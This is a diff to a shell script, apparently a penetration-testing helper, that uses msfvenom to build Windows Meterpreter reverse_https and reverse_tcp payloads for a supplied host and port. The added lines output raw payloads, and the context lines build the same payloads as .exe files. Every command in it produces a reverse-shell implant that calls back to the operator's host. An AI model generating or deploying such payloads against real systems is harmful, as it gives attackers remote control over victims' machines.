@@ -16,6 +16,10 @@ PORT=$2
 
 echo "Generating msfvenom payloads for $HOST:$PORT..."
 
+# Raw payloads (staged)
+msfvenom -p windows/meterpreter/reverse_https LHOST=$HOST LPORT=$PORT -f raw > meterp_revhttps_$HOST-$PORT.raw &
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$HOST LPORT=$PORT -f raw > meterp_revtcp_$HOST-$PORT.raw &
+
 # Windows payloads (staged)
 msfvenom -p windows/meterpreter/reverse_https LHOST=$HOST LPORT=$PORT -f exe > meterp_revhttps_$HOST-$PORT.exe &
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=$HOST LPORT=$PORT -f exe > meterp_revtcp_$HOST-$PORT.exe &
